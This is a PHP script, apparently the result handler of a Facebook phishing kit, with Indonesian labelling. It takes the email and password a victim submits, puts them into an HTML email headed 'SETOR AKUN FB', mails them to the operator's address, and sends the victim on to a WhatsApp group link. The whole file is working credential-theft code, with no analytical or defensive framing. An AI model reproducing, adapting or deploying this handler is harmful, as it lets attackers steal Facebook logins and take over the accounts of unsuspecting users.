<?php
include 'email.php';
$tomail = $emailkamu; 

$email = $_POST['email'];
$password = $_POST['password'];

$subject = "SETOR AKUN FB | Email $email ";
$message = '
<center> 
<div style="padding:5px;width:294;height:40px;background: #A52A2A;color: #A52A2A;text-align:center;">
<img width="40" style="float:center;" src="https://d2ctfgu73hw6a8.cloudfront.net/prod/images/landing/code_orange.png">

</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
<tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Email Facebook</th>
  <th style="width:78%;text-align: center;"><b>'.$email.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>Password Facebook</th>
  <th style="width:78%;text-align: center;"><b>'.$password.'</th> 
 </tr>
 </tr>
</table>
<div style="padding:5px;width:294;height:40px;background: #A52A2A;color:#ffc;text-align:center;">
<font size="3"><b><a href="https://www.facebook.com/ranreseller.id">RANRESELLER ID</a></b></font>
</br>
</div></center>
';

$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: FB  RESULTS <result@jaran.goyank>' . "\r\n";
$datamail = mail($tomail, $subject, $message, $headersx);
header('location: https://chat.whatsapp.com/H7AavicgNXo6UQyUhZLnuJ');
?>